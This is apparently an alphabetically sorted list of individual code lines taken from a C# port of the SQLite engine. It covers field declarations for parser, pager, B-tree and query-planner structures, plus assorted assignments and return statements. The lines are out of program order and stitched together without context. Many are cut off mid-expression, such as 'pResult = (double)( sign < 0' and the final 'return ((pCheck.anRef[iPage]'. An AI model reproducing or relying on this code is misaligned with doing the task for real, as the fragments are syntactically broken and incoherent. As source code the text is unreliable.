      pPtrmap = sqlite3PagerGetData(pDbPage)
      pRes = (int)u32_pRes
      pRes = 0
      pResOut = rc
      pResult = (double)( sign < 0 
      pRet = db.pRollbackArg
      pRet = db.pUpdateArg
      pRet = pVTable
      pRet->pNext = 0
      pRight = pList.a[0].pExpr
      pRight.flags 
      pRoot = pCur.apPage[0]
      pSchema.flags = (u16)( pSchema.flags 
      pSchema.pSeqTab = null
      pSelect.pNext = null
      pSize = id.fs.CanRead 
      pSize = p.endpoint.iOffset
      pSize = pCur.info.nData
      pSrc = p.pSrc
      pSrc.nSrc 
      pSub = pSub1 = pSubitem.pSelect
      pSub = pSubitem.pSelect
      pSubSrc = pSub.pSrc
      pSubitem = pSrc.a[iFrom]
      pSubitem.pSelect = null
      pSubitem.zAlias = null
      pSubitem.zDatabase = null
      pSubitem.zName = null
      pTab = new Table()
      pTab = p.pSrc.a[0].pTab
      pTab = pSrc.a[0].pTab
      pTab->pVTable = 0
      pTab->pVTable = pVTable
      pTab.dbMem = null
      pTab.iPKey = -1
      pTab.nRef = 1
      pTab.tabFlags 
      pTab.zName = null
      pTabItem = pTabList.a != null 
      pTabItem = pWInfo.pTabList.a[pLevel.iFrom]
      pTabList = p.pSrc
      pTabList.a[0].iCursor = iCur = pParse.nTab
      pTable = new Table()
      pTable = tableOfTrigger( pTrigger )
      pTable.aCol = null
      pTable.dbMem = null
      pTable.iPKey = -1
      pTable.nCol = 0
      pTable.nRef = 1
      pTable.nRef--
      pTable.pSchema = db.aDb[iDb].pSchema
      pTable.zName = zName
      pTail = head
      pTemp = db.aDb[db.nDb - 1].pBt
      pTerm = pWC.a[idxTerm]
      pTerm = pWC.a[idx]
      pTerm.eOperator = (u16)( indexable == 0 
      pTerm.eOperator = 0
      pTerm.iParent = -1
      pTerm.leftCursor = -1
      pTerm.pExpr = p
      pTerm.pWC = pWC
      pTerm.prereqAll = prereqAll
      pTerm.prereqRight 
      pTerm.u.pOrInfo = pOrInfo = new WhereOrInfo()
      pTerm.wtFlags 
      pTerm.wtFlags = wtFlags
      pTmp = pA.pNext
      pTmp = pA.pPrev
      pTmpSpace = new u32[BITVEC_SZ]
      pTo->xMutexAlloc = pFrom->xMutexAlloc
      pTo.flags = (u16)( pTo.flags 
      pTo.xDel = null
      pTrig = pParse.pNewTrigger
      pTrig.step_list = pStepList
      pTrigger = new Trigger()
      pTrigger = null
      pTrigger.name = zName
      pTrigger.op = (u8)op
      pTrigger.pSchema = db.aDb[iDb].pSchema
      pTrigger.pTabSchema = pTab.pSchema
      pTrigger.table = pTableName.a[0].zName
      pTrigger.tr_tm = tr_tm == TK_BEFORE 
      pTriggerStep = new TriggerStep()
      pTriggerStep.op = TK_SELECT
      pTriggerStep.orconf = OE_Default
      pTriggerStep.pSelect = pSelect
      pV = new byte[( sz 
      pVTab = null
      pVTable->pNext = db2->pDisconnect
      pVTable->pNext = pTab->pVTable
      pVal = null
      pVal = val
      pVal.flags 
      pValue = (int)v
      pVar = p.aVar[i]
      pVar.flags = MEM_Null
      pVdbeFunc = pCtx.pVdbeFunc
      pVfs = db.pVfs
      pVfs = sqlite3_vfs_find( null )
      pVm = (Vdbe)pStmt
      pVtab->zErrMsg = 0
      pWC = pWInfo.pWC
      pWC.a = pWC.aStatic
      pWC.a[idx = pWC.nTerm
      pWC.nSlot = ArraySize( pWC.aStatic ) - 1
      pWC.nTerm = 0
      pWC.op = (u8)op
      pWC.pMaskSet = pMaskSet
      pWC.pParse = pParse
      pWC.vmask = 0
      pWInfo = new WhereInfo()
      pWInfo.a = new WhereLevel[pTabList.nSrc]
      pWInfo.iBreak = sqlite3VdbeMakeLabel( v )
      pWInfo.iTop = sqlite3VdbeCurrentAddr( v )
      pWInfo.nLevel = pTabList.nSrc
      pWInfo.pParse = pParse
      pWInfo.pTabList = pTabList
      pWInfo.pWC = pWC = new WhereClause()
      pWInfo.wctrlFlags = wctrlFlags
      pWalker.u.i = 0
      pWhere = p.pWhere
      p[0 
      p[0] = (byte)( v >> 24 
      p[0] = (u8)s[(int)offset 
      p[1 
      p[1] = (byte)( v >> 16 
      p[1] = (u8)s[(int)offset 
      p[2 
      p[2] = (byte)( v >> 8 
      p[2] = (u8)s[(int)offset 
      p[3 
      p[3] = (byte)( v 
      p[3] = (u8)s[(int)offset 
      page in any overflow chains used by new divider cells. These
      pageFlags = apOld[0].aData[0]
      pagerUnlockIfUnused( pPager )
      pager_acquire_err:
      pager_reset( pPager )
      pager_unlock( pPager )
      part of a nested parse and writable_schema pragma has not
      pbRev = sortOrder != 0 
      pc = 0
      pcache1 = new PCacheGlobal()
      pcache1.isInit = 1
      pcache1.nMaxPage -= (int)pCache.nMax
      pcache1.nMinPage -= (int)pCache.nMin
      pcache1EnforceMaxPage()
      pcache1EnterMutex()
      pcache1Free( ref p )
      pcache1LeaveMutex()
      piMoved = 0
      piNewColMask 
      piOldColMask 
      piTable = (int)pgnoRoot
      pnCol = nCol = pEList.nExpr
      pnCurrent = pcache1.nCurrentPage
      pnErr = 0
      pnErr = sCheck.nErr
      pnMax = pcache1.nMaxPage
      pnMin = pcache1.nMinPage
      pnPage = nPage
      pnRecyclable = nRecyclable
      pnSize = info.nSize
      pp = p
      pp = pCache.apHash[h]
      pp = sqlite3PagerBackupPtr( sqlite3BtreePager( p.pSrc ) )
      ppBtree = p
      ppChild = pChild
      ppDb = db
      ppDb = null
      ppList = p.pRight
      ppPage = null
      ppPage = pPage
      ppPager = null
      ppPager = pPager
      ppStmt = null
      ppVal = null
      ppVal = pVal
      prNow = (double)timeW 
      proceed to step 5. 
      ptr = pPage.cellOffset 
      public AggInfo Copy()
      public AggInfo pAggInfo
      public AggInfo_col[] aCol
      public AggInfo_func[] aFunc
      public AutoincInfo pAinc
      public AutoincInfo pNext
      public AuxData[] apAux = new AuxData[2]
      public BITVEC_TELEM[] aBitmap = new byte[BITVEC_NELEM]
      public Bitmask colUsed
      public Bitmask indexable
      public Bitmask prereqAll
      public Bitmask prereqRight
      public Bitmask vmask
      public Bitvec pHasContent
      public Bitvec pInJournal
      public Bitvec pInSavepoint
      public Bitvec[] apSub = new Bitvec[BITVEC_NPTR]
      public BtCursor Copy()
      public BtCursor pCursor
      public BtCursor pNext
      public BtCursor pPrev
      public BtShared pBt
      public Btree pBt
      public Btree pBtree
      public Btree pDest
      public Btree pNext
      public Btree pPrev
      public Btree pSrc
      public BtreeMutexArray aMutex
      public Btree[] aBtree = new Btree[SQLITE_MAX_ATTACHED 
      public BusyHandler busyHandler = new BusyHandler()
      public CellInfo info = new CellInfo()
      public CollSeq Copy()
      public CollSeq pColl
      public CollSeq pDfltColl
      public CollSeq[] aColl = new CollSeq[1]
      public Column Copy()
      public Column[] aCol
      public Context[] contextStack
      public DWORD lastErrno
      public DWORD sectorSize
      public DbPage pDbPage
      public Db[] aDb = new Db[SQLITE_MAX_ATTACHED]
      public Expr Copy()
      public Expr Copy_Minimal()
      public Expr pCheck
      public Expr pDflt
      public Expr pExpr
      public Expr pHaving
      public Expr pLeft
      public Expr pLimit
      public Expr pOffset
      public Expr pOn
      public Expr pRight
      public Expr pWhen
      public Expr pWhere
      public Expr yy132
      public ExprList Copy()
      public ExprList pEList
      public ExprList pExprList
      public ExprList pGroupBy
      public ExprList pOrderBy
      public ExprList yy14
      public ExprList_item[] a
      public ExprSpan yy346 = new ExprSpan()
      public Expr[] apVarExpr
      public FILE trace
      public FKey Copy()
      public FKey pFKey
      public FKey pNextFrom
      public FileChunk pChunk
      public FileChunk pFirst
      public FileChunk pNext
      public FilePoint endpoint
      public FilePoint readpoint
      public FileStream fs
      public FuncDef pFunc
      public FuncDef pHash
      public FuncDef pNext
      public FuncDef()
      public FuncDefHash aFunc = new FuncDefHash()
      public FuncDef[] a = new FuncDef[23]
      public Hash Copy()
      public Hash aCollSeq = new Hash()
      public Hash aModule
      public Hash idxHash = new Hash()
      public Hash tblHash = new Hash()
      public Hash trigHash = new Hash()
      public HashElem chain
      public HashElem first
      public HashElem next
      public HashElem prev
      public IdList Copy()
      public IdList pColumns
      public IdList pIdList
      public IdList pUsing
      public IdList yy408
      public IdList_item[] a
      public Index Copy()
      public Index pIndex
      public Index pNext
      public Int32 n
      public KeyInfo Copy()
      public KeyInfo pKeyInfo
      public LikeOp yy96
      public LimitVal yy476
      public Lookaside lookaside = new Lookaside()
      public LookasideSlot pFree
      public LookasideSlot pNext
      public Mem Context
      public Mem _M
      public Mem _Mem
      public Mem pMem
      public Mem s = new Mem()
      public Mem0Global() { }
      public MemPage Copy()
      public MemPage pExtra
      public MemPage pPage
      public MemPage pPage1
      public MemPage[] apPage = new MemPage[BTCURSOR_MAX_DEPTH]
      public Mem[] aColName
      public Mem[] aMem
      public Mem[] aVar
      public Mem[] apArg
      public Mem[] pResultSet
      public Module pMod
      public NameContext pNext
      public Op[] aOp
      public PCache pCache
      public PCache pPCache
      public PCache1 pCache
      public Pager pPager
      public PagerSavepoint[] aSavepoint
      public Parse pParse
      public Parse()
      public PgFreeslot pFree
      public PgFreeslot pNext
      public PgHdr _PgHdr
      public PgHdr pDirty
      public PgHdr pDirtyNext
      public PgHdr pDirtyPrev
      public PgHdr pPage1
      public PgHdr pPgHdr = new PgHdr()
      public PgHdr pSynced
      public PgHdr1 pLruNext
      public PgHdr1 pLruPrev
      public PgHdr1 pNext
      public PgHdr1 pPgHdr1
      public PgHdr1[] apHash
      public Pgno dbFileSize
      public Pgno dbOrigSize
      public Pgno dbSize
      public Pgno iNext
      public Pgno iSubRec
      public Pgno mxPgno
      public Pgno nOrig
      public Pgno nPage
      public Pgno nPagecount
      public Pgno nRemaining
      public Pgno payloadSize
      public Pgno pgno
      public Pgno pgnoRoot
      public RowSetChunk pChunk
      public RowSetChunk pNextChunk
      public RowSetEntry pEntry
      public RowSetEntry pLast
      public RowSetEntry pLeft
      public RowSetEntry pRight
      public RowSetEntry pTree
      public RowSetEntry[] aEntry = new RowSetEntry[ROWSET_ENTRY_PER_CHUNK]
      public RowSetEntry[] pFresh
      public Savepoint pNext
      public Savepoint pSavepoint
      public Schema Copy()
      public Schema pSchema
      public Schema pTabSchema
      public Select Copy()
      public Select pNext
      public Select pPrior
      public Select pRightmost
      public Select pSelect
      public Select yy3
      public SelectDest()
      public SrcList Copy()
      public SrcList pSrc
      public SrcList pSrcList
      public SrcList pTabList
      public SrcList yy65
      public SrcList_item[] a
      public StrAccum _StrAccum
      public StrAccum errMsg = new StrAccum()
      public StringBuilder zBase = new StringBuilder()
      public StringBuilder zTail
      public StringBuilder zText = new StringBuilder()
      public SumCtx _SumCtx
      public Table Copy()
      public Table pFrom
      public Table pNewTable
      public Table pNextZombie
      public Table pSeqTab
      public Table pTab
      public Table pTable
      public Table pVTab
      public Table pZombieTab
      public Token Copy()
      public Token eOperator
      public Token pName
      public Token sLastToken = new Token()
      public Token sNameToken
      public Token target
      public Token()
      public TrigEvent yy378
      public Trigger Copy()
      public Trigger pNewTrigger
      public Trigger pNext
      public Trigger pTrig
      public Trigger pTrigger
      public TriggerStack pNext
      public TriggerStack trigStack
      public TriggerStep Copy()
      public TriggerStep pLast
      public TriggerStep pNext
      public TriggerStep step_list
      public TriggerStep yy473
      public TriggerStep()
      public VTable aVTrans
      public VTable pDisconnect
      public VTable pNext
      public VTable pVTable
      public VTable pVtab
      public Vdbe Copy()
      public Vdbe pNext
      public Vdbe pPrev
      public Vdbe pVdbe
      public VdbeCursor[] apCsr
      public VdbeFunc pVdbeFunc
      public WhereClause pWC
      public WhereClause wc = new WhereClause()
      public WhereLevel[] a = new WhereLevel[] { new WhereLevel() }
      public WhereMaskSet pMaskSet
      public WherePlan plan
      public WherePlan plan = new WherePlan()
      public WhereTerm[] a
      public WhereTerm[] aStatic = new WhereTerm[8]
      public YYACTIONTYPE stateno
      public YYCODETYPE lhs
      public YYCODETYPE major
      public YYMINORTYPE minor
      public _OvflCell Copy()
      public _OvflCell[] aOvfl = new _OvflCell[5]
      public _ht[] ht
      public _u u
      public _u u = new _u()
      public _u1 u1
      public _x x
      public bool CacheAllocated
      public bool Equals( CellInfo ci )
      public bool affChange
      public bool alwaysRollback
      public bool approx
      public bool atFirst
      public bool autoVacuum
      public bool bCoreMutex
      public bool bFullMutex
      public bool bMalloced
      public bool bMemstat
      public bool bPurgeable
      public bool changeCntOn
      public bool changeCountDone
      public bool dbModified
      public bool dbSizeValid
      public bool deferredMoveto
      public bool desc
      public bool doNotSync
      public bool ephemPseudoTable
      public bool exclusiveMode
      public bool expired
      public bool fullSync
      public bool incrVacuum
      public bool isIndex
      public bool isInit
      public bool isPrepareV2
      public bool isSorted
      public bool isTable
      public bool journalStarted
      public bool locked
      public bool needSync
      public bool noCase
      public bool noSync
      public bool not
      public bool nullRow
      public bool omit
      public bool orderByConsumed
      public bool pageSizeFixed
      public bool pseudoTable
      public bool readOnly
      public bool rowidIsValid
      public bool sharable
      public bool sharedCacheEnabled
      public bool tempFile
      public bool usable
      public bool useRandomRowid
      public bool usesStmtJournal
      public bool validNKey
      public bool zeroed
      public byte _base
      public byte charset
      public byte flags
      public byte nrhs
      public byte prefix
      public byte type
      public byte validHMS
      public byte validJD
      public byte validTZ
      public byte validYMD
      public byte[] aData
      public byte[] pCell
      public byte[] pData
      public byte[] pHeap
      public byte[] pKey
      public byte[] pScratch
      public byte[] pTmpSpace
      public byte[] zBLOB
      public byte[] zChunk = new byte[JOURNAL_CHUNKSIZE]
      public char affinity
      public char fmttype
      public char matchAll
      public char matchOne
      public char matchSet
      public class _u
      public class sColMap
      public class sqlite3InitInfo
      public double estimatedCost
      public double nRow
      public double pReal
      public double r
      public double rCost
      public double rSum
      public double s
      public dxAccess xAccess
      public dxBusy xFunc
      public dxBusyHandler xBusyHandler
      public dxCheckReservedLock xCheckReservedLock
      public dxClose xClose
      public dxCollNeeded xCollNeeded
      public dxCollNeeded xCollNeeded16
      public dxCommitCallback xCommitCallback
      public dxCompare xCmp
      public dxCurrentTime xCurrentTime
      public dxDel pFuncDel
      public dxDel xDel
      public dxDel xDelete
      public dxDelCollSeq xDel
      public dxDelete xDelete
      public dxDestroy xDestroy
      public dxDeviceCharacteristics xDeviceCharacteristics
      public dxDlClose xDlClose
      public dxDlError xDlError
      public dxDlOpen xDlOpen
      public dxDlSym xDlSym
      public dxExprCallback xExprCallback
      public dxFileControl xFileControl
      public dxFileSize xFileSize
      public dxFinal xFinalize
      public dxFree xFree
      public dxFreeSchema xFreeSchema
      public dxFullPathname xFullPathname
      public dxFunc xFunc
      public dxGetLastError xGetLastError
      public dxInit[] aExt = null
      public dxLock xLock
      public dxMalloc xMalloc
      public dxMemInit xInit
      public dxMemShutdown xShutdown
      public dxMutexAlloc xMutexAlloc
      public dxMutexEnd xMutexEnd
      public dxMutexEnter xMutexEnter
      public dxMutexFree xMutexFree
      public dxMutexHeld xMutexHeld
      public dxMutexInit xMutexInit
      public dxMutexLeave xMutexLeave
      public dxMutexNotheld xMutexNotheld
      public dxMutexTry xMutexTry
      public dxOpen xOpen
      public dxPC_Cachesize xCachesize
      public dxPC_Create xCreate
      public dxPC_Destroy xDestroy
      public dxPC_Fetch xFetch
      public dxPC_Init xInit
      public dxPC_Pagecount xPagecount
      public dxPC_Rekey xRekey
      public dxPC_Shutdown xShutdown
      public dxPC_Truncate xTruncate
      public dxPC_Unpin xUnpin
      public dxProfile xProfile
      public dxProgress xProgress
      public dxRandomness xRandomness
      public dxRead xRead
      public dxRealloc xRealloc
      public dxReiniter xReiniter
      public dxRollbackCallback xRollbackCallback
      public dxRoundup xRoundup
      public dxSectorSize xSectorSize
      public dxSelectCallback xSelectCallback
      public dxSize xSize
      public dxSleep xSleep
      public dxStep xStep
      public dxStress xStress
      public dxSync xSync
      public dxTrace xTrace
      public dxTruncate xTruncate
      public dxUnlock xUnlock
      public dxUpdateCallback xUpdateCallback
      public dxWrite xWrite
      public dxalarmCallback alarmCallback
      public i16 iAgg
      public i16 iColumn
      public i16 iPage
      public i16 iRightJoinTable
      public i16 nAlloc
      public i16 nArg
      public i16 nReserve
      public i16 nSrc
      public i64 cnt
      public i64 iHdrOffset
      public i64 iKey
      public i64 iOffset
      public i64 iSum
      public i64 journalHdr
      public i64 journalOff
      public i64 journalSizeLimit
      public i64 lastRowid
      public i64 movetoTarget
      public i64 n
      public i64 nKey
      public i64 pI64
      public i64 rowid
      public i64 v
      public int _yyidx
      public int aRow
      public int activeVdbeCnt
      public int addColOffset
      public int addrBrk
      public int addrCont
      public int addrFirst
      public int addrInTop
      public int addrNxt
      public int argvIndex
      public int bDestLocked
      public int btreeMask
      public int busyTimeout
      public int cacheCtr
      public int cacheStatus
      public int cache_size
      public int ckBase
      public int contextStackDepth
      public int contextStackTop
      public int cookieGoto
      public int count
      public int eState
      public int errCode
      public int errMask
      public int explain
      public int flags
      public int i
      public int iBreak
      public int iCacheCnt
      public int iCacheLevel
      public int iCell
      public int iColumn
      public int iContinue
      public int iCur
      public int iCursor
      public int iDb
      public int iDistinct
      public int iECursor
      public int iIdxCur
      public int iLeftJoin
      public int iLevel
      public int iLimit
      public int iMem
      public int iOffset
      public int iPKey
      public int iParent
      public int iParm
      public int iRangeReg
      public int iReg
      public int iSorterColumn
      public int iStatement
      public int iTabCur
      public int iTable
      public int iTermOffset
      public int iTop
      public int iVersion
      public int idx
      public int idxNum
      public int ignoreJump
      public int inProgress
      public int inVtabMethod
      public int isAttached
      public int isError
      public int isInit
      public int isMallocInit
      public int j
      public int leftCursor
      public int locktype
      public int lru
      public int mask
      public int minWriteFileFormat
      public int mxAlloc
      public int mxErr
      public int mxOut
      public int mxParserStack
      public int mxPathname
      public int mxStrlen
      public int n
      public int nAccumulator
      public int nAlias
      public int nAliasAlloc
      public int nAlloc
      public int nAux
      public int nBackup
      public int nBusy
      public int nChange
      public int nChar
      public int nCol
      public int nColumn
      public int nColumnAlloc
      public int nConstraint
      public int nCurrentPage
      public int nData
      public int nDb
      public int nDepth
      public int nErr
      public int nExpr
      public int nExt = 0
      public int nExtension
      public int nField
      public int nFresh
      public int nFunc
      public int nFuncAlloc
      public int nHeap
      public int nHeight
      public int nHit
      public int nId
      public int nKey
      public int nLabel
      public int nLabelAlloc
      public int nLevel
      public int nLookaside
      public int nMax
      public int nMaxPage
      public int nMem
      public int nMinPage
      public int nModuleArg
      public int nMutex
      public int nOp
      public int nOpAlloc
      public int nOrderBy
      public int nOut
      public int nPage
      public int nPageFree
      public int nProgressOps
      public int nRangeReg
      public int nRec
      public int nRef
      public int nRefInitMutex
      public int nSavepoint
      public int nScratch
      public int nScratchFree
      public int nSet
      public int nSlot
      public int nSortingColumn
      public int nStatement
      public int nTab
      public int nTable
      public int nTerm
      public int nTotalChange
      public int nTransaction
      public int nVTrans
      public int nVar
      public int nVarExpr
      public int nVarExprAlloc
      public int needToFreeIdxStr
      public int newIdx
      public int nextAutovac
      public int nextPagesize
      public int oldIdx
      public int op
      public int openFlags
      public int orconf
      public int overflow
      public int p1
      public int p2
      public int p3
      public int p4type
      public int pEnd
      public int pStart
      public int pageHash
      public int pageSize
      public int pc
      public int rc
      public int regCtr
      public int regRoot
      public int regRowid
      public int schema_cookie
      public int seekResult
      public int seqCount
      public int setMaster
      public int sharedLockByte
      public int skipNext
      public int sortingIdx
      public int sync_flags
      public int sz
      public int szExtra
      public int szLookaside
      public int szOsFile
      public int szPage
      public int szScratch
      public int szSlot
      public int tm_hour
      public int tm_isdst
      public int tm_mday
      public int tm_min
      public int tm_mon
      public int tm_sec
      public int tm_wday
      public int tm_yday
      public int tm_year
      public int tnum
      public int tz
      public int wantToLock
      public int writeVdbeCnt
      public int yy328
      public int yyerrcnt
      public int yyidx
      public int yyinit
      public int[] aAlias
      public int[] aCounter = new int[2]
      public int[] aLabel
      public int[] aLimit = new int[SQLITE_N_LIMIT]
      public int[] aPageFree
      public int[] aScratchFree
      public int[] aTempReg = new int[8]
      public int[] addrOpenEphm = new int[3]
      public int[] ai
      public int[] aiColumn
      public int[] aiRowEst
      public int[] anRef
      public int[] cookieValue = new int[SQLITE_MAX_ATTACHED 
      public int[] ix = new int[BMS]
      public int[] mxValue = new int[9]
      public int[] nowValue = new int[9]
      public object _MD5Context
      public object alarmArg
      public object data
      public object p
      public object pAppData
      public object pArg
      public object pAux
      public object pBusyHandlerArg
      public object pCollNeededArg
      public object pCommitArg
      public object pFree
      public object pProfileArg
      public object pProgressArg
      public object pRollbackArg
      public object pStress
      public object pTraceArg
      public object pUpdateArg
      public object pUser
      public object pUserData
      public object[] aExtension
      public sColMap[] aCol
      public sbyte nArg
      public smdxBegin xBegin
      public smdxBestIndex xBestIndex
      public smdxClose xClose
      public smdxColumn xColumn
      public smdxCommit xCommit
      public smdxConnect xConnect
      public smdxCreate xCreate
      public smdxDestroy xDestroy
      public smdxDisconnect xDisconnect
      public smdxEof xEof
      public smdxFilter xFilter
      public smdxFindFunction xFindFunction
      public smdxNext xNext
      public smdxOpen xOpen
      public smdxRename xRename
      public smdxRollback xRollback
      public smdxRowid xRowid
      public smdxSync xSync
      public smdxUpdate xUpdate
      public sqlite3 context_db_handle
      public sqlite3 db
      public sqlite3 dbMem
      public sqlite3 pDestDb
      public sqlite3 pSrcDb
      public sqlite3InitInfo init = new sqlite3InitInfo()
      public sqlite3ParserTOKENTYPE yy0 = new sqlite3ParserTOKENTYPE()
      public sqlite3PrngType Copy()
      public sqlite3_backup pBackup
      public sqlite3_backup pNext
      public sqlite3_file fd
      public sqlite3_file jfd
      public sqlite3_file sjfd
      public sqlite3_index_constraint[] aConstraint
      public sqlite3_index_constraint_usage[] aConstraintUsage
      public sqlite3_index_info pIdxInfo
      public sqlite3_index_orderby[] aOrderBy
      public sqlite3_int64 alarmThreshold
      public sqlite3_int64 cachedRowid
      public sqlite3_int64 iJD
      public sqlite3_io_methods pMethods
      public sqlite3_mem_methods m
      public sqlite3_mem_methods(
      public sqlite3_module pModule
      public sqlite3_mutex mutex
      public sqlite3_mutex pInitMutex
      public sqlite3_mutex_methods mutex
      public sqlite3_mutex_methods(
      public sqlite3_pcache pCache
      public sqlite3_pcache_methods pcache
      public sqlite3_pcache_methods()
      public sqlite3_value pErr
      public sqlite3_vfs pNext
      public sqlite3_vfs pVfs
      public sqlite3_vfs() { }
      public sqlite3_vtab pVtab
      public static implicit operator bool( Bitvec b )
      public static implicit operator bool( PagerSavepoint b )
      public static implicit operator bool( PgHdr b )
      public string idxStr
      public string name
      public string pAux
      public string pKey
      public string pzErrMsg
      public string table
      public string z
      public string zAlias
      public string zAuthContext
      public string zColAff
      public string zColl
      public string zComment
      public string zDatabase
      public string zDb
      public string zDflt
      public string zEnd
      public string zErrMsg
      public string zErrMsg16
      public string zFilename
      public string zIndex
      public string zJournal
      public string zName
      public string zSpan
      public string zStart
      public string zTo
      public string zType
      public string[] azColl
      public string[] azModuleArg
      public string[] azVar
      public struct _u
      public struct _u1
      public struct _x
      public struct _yy429 { public int value
      public struct union_ip
      public struct uw
      public u16 cellOffset
      public u16 eOperator
      public u16 flags
      public u16 flags = MEM_Null
      public u16 flags2
      public u16 iAlias
      public u16 iCol
      public u16 iOverflow
      public u16 idx
      public u16 maskPage
      public u16 maxLeaf
      public u16 maxLocal
      public u16 minLeaf
      public u16 minLocal
      public u16 nCell
      public u16 nCursor
      public u16 nExtra
      public u16 nField
      public u16 nFree
      public u16 nHeader
      public u16 nLocal
      public u16 nRef
      public u16 nResColumn
      public u16 nSize
      public u16 nVar
      public u16 pageSize
      public u16 selFlags
      public u16 usableSize
      public u16 wctrlFlags
      public u16[] aiIdx = new u16[BTCURSOR_MAX_DEPTH]
      public u32 cksumInit
      public u32 cookieMask
      public u32 count
      public u32 dwHighDateTime
      public u32 dwLowDateTime
      public u32 htsize = 31
      public u32 iDestSchema
      public u32 iDivisor
      public u32 iKey
      public u32 iMaxKey
      public u32 iSize
      public u32 magic
      public u32 nData
      public u32 nEq
      public u32 nHash
      public u32 nMax
      public u32 nMin
      public u32 nPage
      public u32 nPayload
      public u32 nRecyclable
      public u32 nSet
      public u32 nSubRec
      public u32 newColMask
      public u32 oldColMask
      public u32 sectorSize
      public u32 vfsFlags
      public u32 writeMask
      public u32 wsFlags
      public u32[] aHash = new u32[BITVEC_NINT]
      public u32[] aOffset
      public u32[] aType
      public u64 startTime
      public u8 allowAgg
      public u8 argType
      public u8 atLast
      public u8 autoCommit
      public u8 autoIndex
      public u8 bEnabled
      public u8 checkSchema
      public u8 childPtrSize
      public u8 code
      public u8 colNamesSet
      public u8 deleteConf
      public u8 dfltJournalMode
      public u8 dfltLockMode
      public u8 directMode
      public u8 done
      public u8 eDest
      public u8 eTextRep
      public u8 enc
      public u8 errorAction
      public u8 explain
      public u8 file_format
      public u8 flags
      public u8 hasAgg
      public u8 hasData
      public u8 hdrOffset
      public u8 i
      public u8 iBatch
      public u8 iColCache
      public u8 iFrom
      public u8 iPrefEnc
      public u8 inTrans
      public u8 inTransaction
      public u8 insertConf
      public u8 intKey
      public u8 isCheck
      public u8 isDeferred
      public u8 isInit
      public u8 isPopulated
      public u8 isPrimKey
      public u8 isTransactionSavepoint
      public u8 jointype
      public u8 journalMode
      public u8 keyConf
      public u8 leaf
      public u8 memDb
      public u8 nChar
      public u8 nChild
      public u8 nColCache
      public u8 nOverflow
      public u8 nTempInUse
      public u8 nTempReg
      public u8 nameClash
      public u8 needCollSeq
      public u8 nested
      public u8 noReadlock
      public u8 notIndexed
      public u8 notNull
      public u8 okOnePass
      public u8 okVar
      public u8 onError
      public u8 op
      public u8 opcode
      public u8 opflags
      public u8 orconf
      public u8 p5
      public u8 parseError
      public u8 safety_level
      public u8 sortOrder
      public u8 state
      public u8 subjInMemory
      public u8 tabFlags
      public u8 tempReg
      public u8 temp_store
      public u8 tooBig
      public u8 tr_tm
      public u8 type
      public u8 type = SQLITE_NULL
      public u8 updateConf
      public u8 useJournal
      public u8 useMalloc
      public u8 useSortingIdx
      public u8 wrFlag
      public u8 wtFlags
      public u8 yy186
      public u8[] aSortOrder
      public u8[] dbFileVers = new u8[16]
      public u8[] pCell
      public u8[] s = new u8[256]
      public union_ip u
      public union_p4 p4 = new union_p4()
      public uw u
      public void Clear()
      public void CopyFrom( Expr cf )
      public void CopyTo( DateTime ct )
      public void CopyTo( Mem ct )
      public void CopyTo( Vdbe ct )
      public void CopyTo( WhereClause wc )
      public void CopyTo( WhereMaskSet wms )
      public void ResetMembers() // Need to clear all the following variables during each recursion
      public void RestoreMembers()  // Need to clear all the following variables during each recursion
      public void SaveMembers() // Need to clear all the following variables during each recursion
      public void_function xBenignBegin
      public void_function xBenignEnd
      public yColCache[] aColCache = new yColCache[SQLITE_N_COLCACHE]
      public yyParser _yyParser
      public yyStackEntry this[int offset]
      public yyStackEntry[] yystack = new yyStackEntry[YYSTACKDEPTH]
      pz = Encoding.UTF8.GetBytes( sz )
      pz = z
      quote = z[0]
      r = sqlite3_value_double( argv[0] )
      r1 = sqlite3GetTempReg( pParse )
      r1 = sqlite3VdbeRealValue( pMem )
      r2 = (double)i
      rc 
      rc = (
      rc = ( p.rc == SQLITE_DONE ) 
      rc = ( y != z )
      rc = 0
      rc = SQLITE_CORRUPT_BKPT
      rc = SQLITE_CORRUPT_BKPT()
      rc = SQLITE_ERROR
      rc = SQLITE_INTERRUPT
      rc = SQLITE_MISUSE
      rc = SQLITE_NOMEM
      rc = SQLITE_OK
      rc = SQLITE_TOOBIG
      rc = WRC_Continue
      rc = balance(pCur)
      rc = btreeInitPage(pPage)
      rc = moveToLeftmost(pCur)
      rc = moveToRoot(pCur)
      rc = p.rc
      rc = pParse.rc
      rc = restoreCursorPosition(pCur)
      rc = sqlite3MutexInit()
      rc = sqlite3OsClose( pFile )
      rc = sqlite3PagerNosync(pBt.pPager) 
      rc = sqlite3PagerSharedLock(pBt.pPager)
      rc = sqlite3PagerWrite(pBt.pPage1.pDbPage)
      rc = sqlite3PagerWrite(pP1.pDbPage)
      rc = sqlite3PagerWrite(pPage.pDbPage)
      rc = sqlite3PagerWrite(pPage1.pDbPage)
      rc = sqlite3PagerWrite(pRoot.pDbPage)
      rc = sqlite3_backup_finish( b )
      rc = sqlite3_errcode( db )
      rc = sqlite3_initialize()
      rc = sqlite3_step( pStmt )
      rc = x(pVtab)
      rc2 == SQLITE_FULL 
      rcauth = SQLITE_OK
      realnum = 0
      ref aNew.pBt )
      ref db.aDb[0].pBt )
      ref i
      regAddrA = 
      regAddrB = 
      regBase = pParse.nMem 
      regData = regNewRowid 
      regData = regRowid 
      regData = sqlite3GetTempReg( pParse )
      regEofA = 
      regEofB = 
      regOldRowid = regNewRowid = pParse.nMem 
      regOutA = 
      regOutB = 
      regRec = sqlite3GetTempReg( pParse )
      regRecord = 
      regRecord = sqlite3GetTempReg( pParse )
      regResult = pDest.iMem
      regRow = sqlite3GetTempReg( pParse )
      regRowid = regIns = pParse.nMem 
      regRowid = sqlite3GetTempReg( pParse )
      releaseAllSavepoints( pPager )
      releasePage(pCur.apPage[pCur.iPage])
      releasePage(pPage)
      releasePage(pPage1)
      releasePage(pPrevTrunk)
      releasePage(pToRelease)
      releasePage(pTrunk)
      res = (sqlite3_int64)mx
      res = (sqlite3_int64)n
      ret = (Pgno)( iPtrMap 
      return
      return ( ( microsec 
      return ( mask != 0 
      return ( opcodeProperty[opcode] 
      return ( p != null ) 
      return ( p == null 
      return ( p.aOp != null 
      return ( p.apHash != null 
      return ( p.isPrepareV2 
      return ( pList != null 
      return ( pPage != null 
      return ( pPage == null 
      return ( pParse.nErr != 0 /
      return ( pPg.flags 
      return ( rc 
      return ( rc != SQLITE_OK 
      return ( rc == SQLITE_OK 
      return ( res != 0 
      return ( state == 0 ) 
      return ( xSectorSize != null 
      return ( zBuf = z )
      return ((pCheck.anRef[iPage]
